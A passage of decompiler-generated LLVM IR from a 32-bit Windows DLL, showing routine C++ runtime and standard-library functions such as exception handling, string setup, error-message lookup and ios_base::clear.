  br i1 %12, label %dec_label_pc_100018fc, label %dec_label_pc_100018f1, !insn.addr !320

dec_label_pc_100018f1:                            ; preds = %dec_label_pc_100018da
  call void @"??3@YAXPAXI@Z"(i32* nonnull %4, i32 ptrtoint (i32* @4 to i32)), !insn.addr !321
  br label %dec_label_pc_100018fc, !insn.addr !322

dec_label_pc_100018fc:                            ; preds = %dec_label_pc_100018f1, %dec_label_pc_100018da
  ret i32 %0, !insn.addr !323
}

define i32 @function_10001910(i8 %arg1) {
dec_label_pc_10001910:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = and i8 %arg1, 1, !insn.addr !324
  %2 = icmp eq i8 %1, 0, !insn.addr !324
  %3 = inttoptr i32 %0 to i32*, !insn.addr !325
  store i32 ptrtoint (i32* @global_var_1002d418 to i32), i32* %3, align 4, !insn.addr !325
  br i1 %2, label %dec_label_pc_1000192d, label %dec_label_pc_10001922, !insn.addr !326

dec_label_pc_10001922:                            ; preds = %dec_label_pc_10001910
  call void @"??3@YAXPAXI@Z"(i32* %3, i32 ptrtoint (i32* @4 to i32)), !insn.addr !327
  br label %dec_label_pc_1000192d, !insn.addr !328

dec_label_pc_1000192d:                            ; preds = %dec_label_pc_10001922, %dec_label_pc_10001910
  ret i32 %0, !insn.addr !329
}

define i32 @function_10001940(i32 %arg1) local_unnamed_addr {
dec_label_pc_10001940:
  ret i32 %arg1, !insn.addr !330
}

define i32 @function_10001970(i32 %arg1, i32 %arg2) {
dec_label_pc_10001970:
  %0 = inttoptr i32 %arg1 to i32*, !insn.addr !331
  store i32 %arg2, i32* %0, align 4, !insn.addr !331
  %1 = add i32 %arg1, 4, !insn.addr !332
  %2 = inttoptr i32 %1 to i32*, !insn.addr !332
  ret i32 %arg1, !insn.addr !333
}

define i32 @function_10001990(i32 %arg1, i32 %arg2) {
dec_label_pc_10001990:
  %eax.0.reg2mem = alloca i32, !insn.addr !334
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 4, !insn.addr !335
  %2 = inttoptr i32 %1 to i32*, !insn.addr !335
  %3 = load i32, i32* %2, align 4, !insn.addr !335
  %4 = add i32 %arg2, 4, !insn.addr !336
  %5 = inttoptr i32 %4 to i32*, !insn.addr !336
  %6 = load i32, i32* %5, align 4, !insn.addr !336
  %7 = add i32 %3, 4, !insn.addr !337
  %8 = inttoptr i32 %7 to i32*, !insn.addr !337
  %9 = load i32, i32* %8, align 4, !insn.addr !337
  %10 = add i32 %6, 4, !insn.addr !338
  %11 = inttoptr i32 %10 to i32*, !insn.addr !338
  %12 = load i32, i32* %11, align 4, !insn.addr !338
  %13 = icmp eq i32 %9, %12, !insn.addr !338
  %14 = icmp eq i1 %13, false, !insn.addr !339
  br i1 %14, label %dec_label_pc_100019c3, label %dec_label_pc_100019b4, !insn.addr !339

dec_label_pc_100019b4:                            ; preds = %dec_label_pc_10001990
  %15 = inttoptr i32 %arg2 to i32*, !insn.addr !340
  %16 = load i32, i32* %15, align 4, !insn.addr !340
  %17 = icmp eq i32 %9, %16, !insn.addr !340
  %18 = icmp eq i1 %17, false, !insn.addr !341
  store i32 %9, i32* %eax.0.reg2mem, !insn.addr !341
  br i1 %18, label %dec_label_pc_100019c3, label %dec_label_pc_100019ba, !insn.addr !341

dec_label_pc_100019ba:                            ; preds = %dec_label_pc_100019b4
  %19 = and i32 %9, -256, !insn.addr !342
  %20 = or i32 %19, 1, !insn.addr !342
  ret i32 %20, !insn.addr !343

dec_label_pc_100019c3:                            ; preds = %dec_label_pc_100019b4, %dec_label_pc_10001990
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %21 = and i32 %eax.0.reload, -256, !insn.addr !344
  ret i32 %21, !insn.addr !345
}

define i32 @function_100019d0(i32 %arg1, i32 %arg2) {
dec_label_pc_100019d0:
  %eax.0.reg2mem = alloca i32, !insn.addr !346
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 4, !insn.addr !347
  %2 = inttoptr i32 %1 to i32*, !insn.addr !347
  %3 = load i32, i32* %2, align 4, !insn.addr !347
  %4 = add i32 %arg1, 4, !insn.addr !348
  %5 = inttoptr i32 %4 to i32*, !insn.addr !348
  %6 = load i32, i32* %5, align 4, !insn.addr !348
  %7 = add i32 %6, 4, !insn.addr !349
  %8 = inttoptr i32 %7 to i32*, !insn.addr !349
  %9 = load i32, i32* %8, align 4, !insn.addr !349
  %10 = icmp eq i32 %3, %9, !insn.addr !349
  %11 = icmp eq i1 %10, false, !insn.addr !350
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !350
  br i1 %11, label %dec_label_pc_100019f0, label %dec_label_pc_100019e2, !insn.addr !350

dec_label_pc_100019e2:                            ; preds = %dec_label_pc_100019d0
  %12 = inttoptr i32 %arg1 to i32*, !insn.addr !351
  %13 = load i32, i32* %12, align 4, !insn.addr !351
  %14 = icmp eq i32 %13, %arg2, !insn.addr !352
  %15 = icmp eq i1 %14, false, !insn.addr !353
  store i32 %13, i32* %eax.0.reg2mem, !insn.addr !353
  br i1 %15, label %dec_label_pc_100019f0, label %dec_label_pc_100019e9, !insn.addr !353

dec_label_pc_100019e9:                            ; preds = %dec_label_pc_100019e2
  %16 = and i32 %13, -256, !insn.addr !354
  %17 = or i32 %16, 1, !insn.addr !354
  ret i32 %17, !insn.addr !355

dec_label_pc_100019f0:                            ; preds = %dec_label_pc_100019e2, %dec_label_pc_100019d0
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %18 = and i32 %eax.0.reload, -256, !insn.addr !356
  ret i32 %18, !insn.addr !357
}

define i32 @function_10001a00(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10001a00:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @function_100066a0(i32 %0), !insn.addr !358
  %2 = add i32 %arg1, 4, !insn.addr !359
  %3 = inttoptr i32 %2 to i32*, !insn.addr !359
  store i32 %1, i32* %3, align 4, !insn.addr !359
  %4 = inttoptr i32 %arg1 to i32*, !insn.addr !360
  store i32 %arg2, i32* %4, align 4, !insn.addr !360
  ret i32 %arg1, !insn.addr !361
}

define i32 @function_10001a20(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10001a20:
  %ecx.0.reg2mem = alloca i32, !insn.addr !362
  %eax.1.reg2mem = alloca i32, !insn.addr !362
  %eax.0.reg2mem = alloca i32, !insn.addr !362
  %esp.0.reg2mem = alloca i32, !insn.addr !362
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-60 = alloca i8, align 1
  %stack_var_-84 = alloca i8*, align 4
  %1 = call i64 @__decompiler_undefined_function_7()
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %2 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !363
  %3 = call i32 @__readfsdword(i32 0), !insn.addr !364
  store i32 %3, i32* %stack_var_-28, align 4, !insn.addr !365
  %4 = load i32, i32* @global_var_1003e084, align 4, !insn.addr !366
  %5 = xor i32 %4, %2, !insn.addr !367
  store i32 %5, i32* %stack_var_-76, align 4, !insn.addr !368
  %6 = ptrtoint i32* %stack_var_-76 to i32, !insn.addr !368
  %7 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !369
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !370
  %8 = trunc i64 %1 to i32, !insn.addr !371
  %9 = icmp eq i32 %8, 0, !insn.addr !371
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !372
  br i1 %9, label %dec_label_pc_10001a83, label %dec_label_pc_10001a74, !insn.addr !372

dec_label_pc_10001a74:                            ; preds = %dec_label_pc_10001a20
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10039c78, i32 0, i32 0), i8** %stack_var_-84, align 4, !insn.addr !373
  %10 = ptrtoint i8** %stack_var_-84 to i32, !insn.addr !373
  %11 = call i32 @function_10005140(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10039c78, i32 0, i32 0), i32 2), !insn.addr !374
  store i32 %10, i32* %esp.0.reg2mem, !insn.addr !374
  br label %dec_label_pc_10001a83, !insn.addr !374

dec_label_pc_10001a83:                            ; preds = %dec_label_pc_10001a74, %dec_label_pc_10001a20
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %12 = add i32 %esp.0.reload, -4, !insn.addr !375
  %13 = inttoptr i32 %12 to i32*, !insn.addr !375
  %14 = ptrtoint i8* %stack_var_-60 to i32, !insn.addr !375
  store i32 %14, i32* %13, align 4, !insn.addr !375
  %15 = call i32 @function_10001940(i32 ptrtoint (i32* @4 to i32)), !insn.addr !376
  %16 = add i32 %esp.0.reload, -8, !insn.addr !377
  %17 = inttoptr i32 %16 to i32*, !insn.addr !377
  store i32 -1, i32* %17, align 4, !insn.addr !377
  %18 = add i32 %esp.0.reload, -12, !insn.addr !378
  %19 = inttoptr i32 %18 to i32*, !insn.addr !378
  store i32 0, i32* %19, align 4, !insn.addr !378
  %20 = add i32 %esp.0.reload, -16, !insn.addr !379
  %21 = inttoptr i32 %20 to i32*, !insn.addr !379
  store i32 %15, i32* %21, align 4, !insn.addr !379
  %22 = call i32 @function_10005230(i8 1, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32)), !insn.addr !380
  %23 = icmp ult i32 %0, 16, !insn.addr !381
  br i1 %23, label %dec_label_pc_10001aea, label %dec_label_pc_10001aa8, !insn.addr !382

dec_label_pc_10001aa8:                            ; preds = %dec_label_pc_10001a83
  %24 = load i8, i8* %stack_var_-60, align 1, !insn.addr !383
  %25 = sext i8 %24 to i32, !insn.addr !383
  %26 = add i32 %0, 1, !insn.addr !384
  %27 = icmp ult i32 %26, 4096, !insn.addr !385
  store i32 %25, i32* %ecx.0.reg2mem, !insn.addr !386
  br i1 %27, label %dec_label_pc_10001ae1, label %dec_label_pc_10001ab3, !insn.addr !386

dec_label_pc_10001ab3:                            ; preds = %dec_label_pc_10001aa8
  %28 = and i32 %25, 31
  %29 = icmp eq i32 %28, 0, !insn.addr !387
  br i1 %29, label %dec_label_pc_10001abd, label %dec_label_pc_10001ab8, !insn.addr !388

dec_label_pc_10001ab8:                            ; preds = %dec_label_pc_10001ab3
  %30 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !389
  br label %dec_label_pc_10001abd, !insn.addr !389

dec_label_pc_10001abd:                            ; preds = %dec_label_pc_10001ab8, %dec_label_pc_10001ab3
  %31 = add nsw i32 %25, -4, !insn.addr !390
  %32 = inttoptr i32 %31 to i32*, !insn.addr !390
  %33 = load i32, i32* %32, align 4, !insn.addr !390
  %34 = icmp ult i32 %33, %25, !insn.addr !391
  store i32 %33, i32* %eax.0.reg2mem, !insn.addr !392
  br i1 %34, label %dec_label_pc_10001ac9, label %dec_label_pc_10001ac4, !insn.addr !392

dec_label_pc_10001ac4:                            ; preds = %dec_label_pc_10001abd
  %35 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !393
  store i32 %35, i32* %eax.0.reg2mem, !insn.addr !393
  br label %dec_label_pc_10001ac9, !insn.addr !393

dec_label_pc_10001ac9:                            ; preds = %dec_label_pc_10001ac4, %dec_label_pc_10001abd
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %36 = sub i32 %25, %eax.0.reload, !insn.addr !394
  %37 = icmp ult i32 %36, 4, !insn.addr !395
  %38 = icmp eq i1 %37, false, !insn.addr !396
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !396
  br i1 %38, label %dec_label_pc_10001ad5, label %dec_label_pc_10001ad0, !insn.addr !396

dec_label_pc_10001ad0:                            ; preds = %dec_label_pc_10001ac9
  %39 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !397
  store i32 %39, i32* %eax.1.reg2mem, !insn.addr !397
  br label %dec_label_pc_10001ad5, !insn.addr !397

dec_label_pc_10001ad5:                            ; preds = %dec_label_pc_10001ad0, %dec_label_pc_10001ac9
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %40 = icmp ult i32 %36, 36
  store i32 %eax.1.reload, i32* %ecx.0.reg2mem, !insn.addr !398
  br i1 %40, label %dec_label_pc_10001ae1, label %dec_label_pc_10001ada, !insn.addr !398

dec_label_pc_10001ada:                            ; preds = %dec_label_pc_10001ad5
  %41 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !399
  store i32 %41, i32* %ecx.0.reg2mem, !insn.addr !399
  br label %dec_label_pc_10001ae1, !insn.addr !399

dec_label_pc_10001ae1:                            ; preds = %dec_label_pc_10001ad5, %dec_label_pc_10001ada, %dec_label_pc_10001aa8
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %42 = add i32 %esp.0.reload, -20, !insn.addr !400
  %43 = inttoptr i32 %42 to i32*, !insn.addr !400
  store i32 %ecx.0.reload, i32* %43, align 4, !insn.addr !400
  call void @function_10011ad6(i32* nonnull @4), !insn.addr !401
  br label %dec_label_pc_10001aea, !insn.addr !402

dec_label_pc_10001aea:                            ; preds = %dec_label_pc_10001ae1, %dec_label_pc_10001a83
  %44 = call i128 @__asm_movups.44(i128 undef), !insn.addr !403
  %45 = add i32 %arg2, 16, !insn.addr !404
  %46 = inttoptr i32 %45 to i32*, !insn.addr !404
  store i32 0, i32* %46, align 4, !insn.addr !404
  %47 = add i32 %arg2, 20, !insn.addr !405
  %48 = inttoptr i32 %47 to i32*, !insn.addr !405
  store i32 0, i32* %48, align 4, !insn.addr !405
  %49 = inttoptr i32 %arg2 to i128*, !insn.addr !406
  %50 = load i128, i128* %49, align 4, !insn.addr !406
  call void @__asm_movups(i128 %50, i128 %44), !insn.addr !406
  %51 = mul i64 %1, 4294967296
  %52 = sdiv i64 %51, 4294967296, !insn.addr !407
  %53 = call i128 @__asm_movq(i64 %52), !insn.addr !407
  %54 = inttoptr i32 %45 to i64*, !insn.addr !408
  %55 = load i64, i64* %54, align 4, !insn.addr !408
  call void @__asm_movq.40(i64 %55, i128 %53), !insn.addr !408
  %56 = load i32, i32* %stack_var_-28, align 4, !insn.addr !409
  call void @__writefsdword(i32 0, i32 %56), !insn.addr !410
  %57 = call i32 @"@__security_check_cookie@4"(), !insn.addr !411
  ret i32 %57, !insn.addr !412
}

define i32 @function_10001b30(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_10001b30:
  %ecx.0.reg2mem = alloca i32, !insn.addr !413
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i128 @__decompiler_undefined_function_4()
  %3 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-48 = alloca i8, align 1
  %4 = trunc i32 %0 to i8, !insn.addr !414
  store i8 %4, i8* %stack_var_-48, align 1, !insn.addr !414
  %5 = ptrtoint i8* %arg3 to i32, !insn.addr !415
  %6 = call i32 @function_10006080(i32 %5, i32 0, i32 -1, i8 0), !insn.addr !415
  %7 = bitcast i8* %stack_var_-48 to i32*, !insn.addr !416
  %8 = call i32 @function_10001a20(i32* nonnull %7, i32 %arg1, i32 %arg2), !insn.addr !416
  %9 = add i32 %1, 4, !insn.addr !417
  %10 = inttoptr i32 %1 to i32*, !insn.addr !418
  store i32 ptrtoint (%vtable_1002d3b4_type* @global_var_1002d3b4 to i32), i32* %10, align 4, !insn.addr !418
  %11 = call i128 @__asm_xorps(i128 %2, i128 %2), !insn.addr !419
  %12 = inttoptr i32 %9 to i64*, !insn.addr !420
  %13 = load i64, i64* %12, align 4, !insn.addr !420
  call void @__asm_movq.40(i64 %13, i128 %11), !insn.addr !420
  %14 = call i32 @___std_exception_copy(), !insn.addr !421
  store i32 ptrtoint (i32* @global_var_1002d3c0 to i32), i32* %10, align 4, !insn.addr !422
  %15 = icmp ult i32 %3, 16, !insn.addr !423
  br i1 %15, label %dec_label_pc_10001bf0, label %dec_label_pc_10001bc1, !insn.addr !424

dec_label_pc_10001bc1:                            ; preds = %dec_label_pc_10001b30
  %16 = load i8, i8* %stack_var_-48, align 1, !insn.addr !425
  %17 = sext i8 %16 to i32, !insn.addr !425
  %18 = add i32 %3, 1, !insn.addr !426
  %19 = icmp ult i32 %18, 4096, !insn.addr !427
  store i32 %17, i32* %ecx.0.reg2mem, !insn.addr !428
  br i1 %19, label %dec_label_pc_10001be7, label %dec_label_pc_10001bcd, !insn.addr !428

dec_label_pc_10001bcd:                            ; preds = %dec_label_pc_10001bc1
  %20 = and i32 %17, 31
  %21 = icmp eq i32 %20, 0, !insn.addr !429
  %22 = icmp eq i1 %21, false, !insn.addr !430
  br i1 %22, label %dec_label_pc_10001c16, label %dec_label_pc_10001bd2, !insn.addr !430

dec_label_pc_10001bd2:                            ; preds = %dec_label_pc_10001bcd
  %23 = add nsw i32 %17, -4, !insn.addr !431
  %24 = inttoptr i32 %23 to i32*, !insn.addr !431
  %25 = load i32, i32* %24, align 4, !insn.addr !431
  %26 = icmp ult i32 %25, %17, !insn.addr !432
  %27 = icmp eq i1 %26, false, !insn.addr !433
  br i1 %27, label %dec_label_pc_10001c1b, label %dec_label_pc_10001bd9, !insn.addr !433

dec_label_pc_10001bd9:                            ; preds = %dec_label_pc_10001bd2
  %28 = sub i32 %17, %25, !insn.addr !434
  %29 = icmp ult i32 %28, 4, !insn.addr !435
  br i1 %29, label %dec_label_pc_10001c20, label %dec_label_pc_10001be0, !insn.addr !436

dec_label_pc_10001be0:                            ; preds = %dec_label_pc_10001bd9
  %30 = icmp ult i32 %28, 36
  store i32 %25, i32* %ecx.0.reg2mem, !insn.addr !437
  br i1 %30, label %dec_label_pc_10001be7, label %dec_label_pc_10001c25, !insn.addr !437

dec_label_pc_10001be7:                            ; preds = %dec_label_pc_10001be0, %dec_label_pc_10001bc1
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %31 = inttoptr i32 %ecx.0.reload to i32*, !insn.addr !438
  call void @function_10011ad6(i32* %31), !insn.addr !438
  br label %dec_label_pc_10001bf0, !insn.addr !439

dec_label_pc_10001bf0:                            ; preds = %dec_label_pc_10001be7, %dec_label_pc_10001b30
  %32 = add i32 %1, 12, !insn.addr !440
  %33 = inttoptr i32 %32 to i32*, !insn.addr !440
  store i32 %arg1, i32* %33, align 4, !insn.addr !440
  %34 = add i32 %1, 16, !insn.addr !441
  %35 = inttoptr i32 %34 to i32*, !insn.addr !441
  store i32 %arg2, i32* %35, align 4, !insn.addr !441
  store i32 ptrtoint (%vtable_1002d434_type* @global_var_1002d434 to i32), i32* %10, align 4, !insn.addr !442
  %36 = call i32 @"@__security_check_cookie@4"(), !insn.addr !443
  ret i32 %36, !insn.addr !444

dec_label_pc_10001c16:                            ; preds = %dec_label_pc_10001bcd
  %37 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !445
  br label %dec_label_pc_10001c1b, !insn.addr !445

dec_label_pc_10001c1b:                            ; preds = %dec_label_pc_10001c16, %dec_label_pc_10001bd2
  %38 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !446
  br label %dec_label_pc_10001c20, !insn.addr !446

dec_label_pc_10001c20:                            ; preds = %dec_label_pc_10001c1b, %dec_label_pc_10001bd9
  %39 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !447
  br label %dec_label_pc_10001c25, !insn.addr !447

dec_label_pc_10001c25:                            ; preds = %dec_label_pc_10001be0, %dec_label_pc_10001c20
  %40 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !448
  %41 = call i32 @__asm_int3(), !insn.addr !449
  %42 = call i32 @__asm_int3(), !insn.addr !450
  %43 = call i32 @__asm_int3(), !insn.addr !451
  %44 = call i32 @__asm_int3(), !insn.addr !452
  %45 = call i32 @__asm_int3(), !insn.addr !453
  %46 = call i32 @__asm_int3(), !insn.addr !454
  ret i32 %46, !insn.addr !454
}

define i32 @function_10001c30(i8 %arg1) {
dec_label_pc_10001c30:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = add i32 %2, 4, !insn.addr !455
  %4 = inttoptr i32 %2 to i32*, !insn.addr !456
  store i32 ptrtoint (%vtable_1002d3b4_type* @global_var_1002d3b4 to i32), i32* %4, align 4, !insn.addr !456
  %5 = call i32 @___std_exception_destroy(i32 %3, i32 %0, i32 %1), !insn.addr !457
  %6 = and i8 %arg1, 1, !insn.addr !458
  %7 = icmp eq i8 %6, 0, !insn.addr !458
  br i1 %7, label %dec_label_pc_10001c59, label %dec_label_pc_10001c4e, !insn.addr !459

dec_label_pc_10001c4e:                            ; preds = %dec_label_pc_10001c30
  call void @"??3@YAXPAXI@Z"(i32* %4, i32 ptrtoint (i32* @4 to i32)), !insn.addr !460
  br label %dec_label_pc_10001c59, !insn.addr !461

dec_label_pc_10001c59:                            ; preds = %dec_label_pc_10001c4e, %dec_label_pc_10001c30
  ret i32 %2, !insn.addr !462
}

define i32 @function_10001c60(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10001c60:
  %ecx.0.reg2mem = alloca i32, !insn.addr !463
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-48 = alloca i8, align 1
  %stack_var_-16 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !464
  store i32 %1, i32* %stack_var_-16, align 4, !insn.addr !465
  %2 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !466
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !467
  store i8 0, i8* %stack_var_-48, align 1, !insn.addr !468
  store i32 %arg3, i32* %ecx.0.reg2mem, !insn.addr !469
  br label %dec_label_pc_10001cb0, !insn.addr !469

dec_label_pc_10001cb0:                            ; preds = %dec_label_pc_10001cb0, %dec_label_pc_10001c60
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %3 = inttoptr i32 %ecx.0.reload to i8*, !insn.addr !470
  %4 = load i8, i8* %3, align 1, !insn.addr !470
  %5 = add i32 %ecx.0.reload, 1, !insn.addr !471
  %6 = icmp eq i8 %4, 0, !insn.addr !472
  %7 = icmp eq i1 %6, false, !insn.addr !473
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !473
  br i1 %7, label %dec_label_pc_10001cb0, label %dec_label_pc_10001cb7, !insn.addr !473

dec_label_pc_10001cb7:                            ; preds = %dec_label_pc_10001cb0
  %8 = sub i32 %ecx.0.reload, %arg3, !insn.addr !474
  %9 = call i32 @function_10005070(i32 %arg3, i32 %8), !insn.addr !475
  %10 = call i32 @function_10001b30(i32 %arg1, i32 %arg2, i8* nonnull %stack_var_-48), !insn.addr !476
  %11 = inttoptr i32 %0 to i32*, !insn.addr !477
  store i32 ptrtoint (i32* @global_var_1002d440 to i32), i32* %11, align 4, !insn.addr !477
  %12 = load i32, i32* %stack_var_-16, align 4, !insn.addr !478
  call void @__writefsdword(i32 0, i32 %12), !insn.addr !479
  %13 = call i32 @"@__security_check_cookie@4"(), !insn.addr !480
  ret i32 %13, !insn.addr !481
}

define i32 @function_10001d50(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10001d50:
  %ecx.0.reg2mem = alloca i32, !insn.addr !482
  %0 = call i32 @"?_Syserror_map@std@@YAPBDH@Z"(i32 %arg2), !insn.addr !483
  %1 = add i32 %arg1, 16, !insn.addr !484
  %2 = inttoptr i32 %1 to i32*, !insn.addr !484
  store i32 0, i32* %2, align 4, !insn.addr !484
  %3 = add i32 %arg1, 20, !insn.addr !485
  %4 = inttoptr i32 %3 to i32*, !insn.addr !485
  store i32 15, i32* %4, align 4, !insn.addr !485
  %5 = inttoptr i32 %arg1 to i8*, !insn.addr !486
  store i8 0, i8* %5, align 1, !insn.addr !486
  store i32 %0, i32* %ecx.0.reg2mem, !insn.addr !486
  br label %dec_label_pc_10001d83, !insn.addr !486

dec_label_pc_10001d83:                            ; preds = %dec_label_pc_10001d83, %dec_label_pc_10001d50
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %6 = inttoptr i32 %ecx.0.reload to i8*, !insn.addr !487
  %7 = load i8, i8* %6, align 1, !insn.addr !487
  %8 = add i32 %ecx.0.reload, 1, !insn.addr !488
  %9 = icmp eq i8 %7, 0, !insn.addr !489
  %10 = icmp eq i1 %9, false, !insn.addr !490
  store i32 %8, i32* %ecx.0.reg2mem, !insn.addr !490
  br i1 %10, label %dec_label_pc_10001d83, label %dec_label_pc_10001d8a, !insn.addr !490

dec_label_pc_10001d8a:                            ; preds = %dec_label_pc_10001d83
  %11 = sub i32 %ecx.0.reload, %0, !insn.addr !491
  %12 = call i32 @function_10005070(i32 %0, i32 %11), !insn.addr !492
  ret i32 %arg1, !insn.addr !493
}

define i32 @function_10001da0() {
dec_label_pc_10001da0:
  ret i32 ptrtoint ([9 x i8]* @global_var_10039c7c to i32), !insn.addr !494
}

define i32 @function_10001db0(i32 %arg1, i32 %arg2) {
dec_label_pc_10001db0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = icmp eq i32 %arg2, 1, !insn.addr !495
  %3 = icmp eq i1 %2, false, !insn.addr !496
  br i1 %3, label %dec_label_pc_10001def, label %dec_label_pc_10001dc7, !insn.addr !496

dec_label_pc_10001dc7:                            ; preds = %dec_label_pc_10001db0
  %4 = add i32 %arg1, 16, !insn.addr !497
  %5 = inttoptr i32 %4 to i32*, !insn.addr !497
  store i32 0, i32* %5, align 4, !insn.addr !497
  %6 = add i32 %arg1, 20, !insn.addr !498
  %7 = inttoptr i32 %6 to i32*, !insn.addr !498
  store i32 15, i32* %7, align 4, !insn.addr !498
  %8 = inttoptr i32 %arg1 to i8*, !insn.addr !499
  store i8 0, i8* %8, align 1, !insn.addr !499
  %9 = call i32 @function_10005070(i32 ptrtoint ([22 x i8]* @global_var_10039c88 to i32), i32 21), !insn.addr !500
  ret i32 %arg1, !insn.addr !501

dec_label_pc_10001def:                            ; preds = %dec_label_pc_10001db0
  %10 = call i32 @function_10001d50(i32 %arg1, i32 %arg2, i32 %0, i32 0, i32 %1), !insn.addr !502
  ret i32 %arg1, !insn.addr !503
}

define i32 @function_10001e00(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10001e00:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = add i32 %arg2, 4, !insn.addr !504
  %4 = inttoptr i32 %3 to i32*, !insn.addr !504
  %5 = load i32, i32* %4, align 4, !insn.addr !504
  %6 = inttoptr i32 %arg2 to i32*, !insn.addr !505
  %7 = load i32, i32* %6, align 4, !insn.addr !505
  %8 = ptrtoint i8* %arg1 to i32, !insn.addr !506
  %9 = call i32 @function_10001c60(i32 %7, i32 %5, i32 %8, i32 %0, i32 %2, i32 %1), !insn.addr !506
  %10 = inttoptr i32 %2 to i32*, !insn.addr !507
  store i32 ptrtoint (i32* @global_var_1002d468 to i32), i32* %10, align 4, !insn.addr !507
  ret i32 %2, !insn.addr !508
}

define void @"?clear@ios_base@std@@QAEXH_N@Z"(i32* %result, i32 %arg2, i1 %arg3) local_unnamed_addr {
dec_label_pc_10001e30:
  %esp.1.reg2mem = alloca i32, !insn.addr !509
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !509
  %esp.0.reg2mem = alloca i32, !insn.addr !509
  %0 = ptrtoint i32* %result to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i8*, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %1 = and i32 %arg2, 23, !insn.addr !510
  %2 = add i32 %0, 12, !insn.addr !511
  %3 = inttoptr i32 %2 to i32*, !insn.addr !511
  store i32 %1, i32* %3, align 4, !insn.addr !511
  %4 = add i32 %0, 16, !insn.addr !512
  %5 = inttoptr i32 %4 to i32*, !insn.addr !512
  %6 = load i32, i32* %5, align 4, !insn.addr !512
  %7 = and i32 %6, %1, !insn.addr !513
  %8 = icmp eq i32 %7, 0, !insn.addr !513
  br i1 %8, label %dec_label_pc_10001e62, label %dec_label_pc_10001e49, !insn.addr !514

dec_label_pc_10001e49:                            ; preds = %dec_label_pc_10001e30
  %9 = icmp eq i1 %arg3, false, !insn.addr !515
  %10 = icmp eq i1 %9, false, !insn.addr !516
  br i1 %10, label %dec_label_pc_10001e68, label %dec_label_pc_10001e4f, !insn.addr !516

dec_label_pc_10001e4f:                            ; preds = %dec_label_pc_10001e49
  %11 = bitcast i32* %stack_var_-36 to i8*
  store i8* %11, i8** %stack_var_-48, align 4, !insn.addr !517
  %12 = and i32 %7, 4
  %13 = icmp eq i32 %12, 0, !insn.addr !518
  %14 = icmp eq i1 %13, false, !insn.addr !519
  br i1 %14, label %dec_label_pc_10001e71, label %dec_label_pc_10001e5b, !insn.addr !519

dec_label_pc_10001e5b:                            ; preds = %dec_label_pc_10001e4f
  %15 = ptrtoint i8** %stack_var_-48 to i32, !insn.addr !517
  %16 = and i32 %7, 2
  %17 = icmp eq i32 %16, 0, !insn.addr !520
  %18 = icmp eq i1 %17, false, !insn.addr !521
  store i32 %15, i32* %esp.0.reg2mem, !insn.addr !521
  br i1 %18, label %dec_label_pc_10001e97, label %dec_label_pc_10001e5b.dec_label_pc_10001ebd_crit_edge, !insn.addr !521

dec_label_pc_10001e5b.dec_label_pc_10001ebd_crit_edge: ; preds = %dec_label_pc_10001e5b
  %.pre = bitcast i8** %stack_var_-48 to i32*, !insn.addr !522
  store i32* %.pre, i32** %.pre-phi.reg2mem
